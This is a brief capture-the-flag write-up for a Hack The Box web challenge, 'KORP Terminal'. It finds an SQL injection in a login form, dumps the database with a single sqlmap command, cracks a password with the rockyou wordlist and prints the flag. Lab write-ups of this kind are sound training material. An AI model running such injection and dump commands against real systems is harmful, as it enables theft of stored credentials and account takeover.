# KORP Terminal

## Enumeration

The web application shows a very nice old school login prompt:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/876db01f-d0b7-49c1-850e-c6ee07b9a4e7)

If we try a single quote we get a very helpful SQL error indicating a possible SQL Injection vulnerability:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/8ae2a9db-a3ba-41d6-9670-16ad6b5de537)

## Solution
In this case SQLMap goes brrr. We don't need to conserve our time for the harder challenges ahead.
```bash
sqlmap -r req.txt -p username --dbms=mysql --ignore-code 401 --dump
```
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/f3d0ba4a-c63e-46dd-9e9b-4f3db1f2549f)

Easy crack with rockyou since it's one of the first passwords in the wordlist:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/f26d7b15-ca8d-43bf-a7a5-795a2284d6d1)

After we log in, we get our flag:  
![image](https://github.com/LazyTitan33/CTF-Writeups/assets/80063008/473d9508-41fe-463a-9ec2-9c5b72488f31)

`HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}`
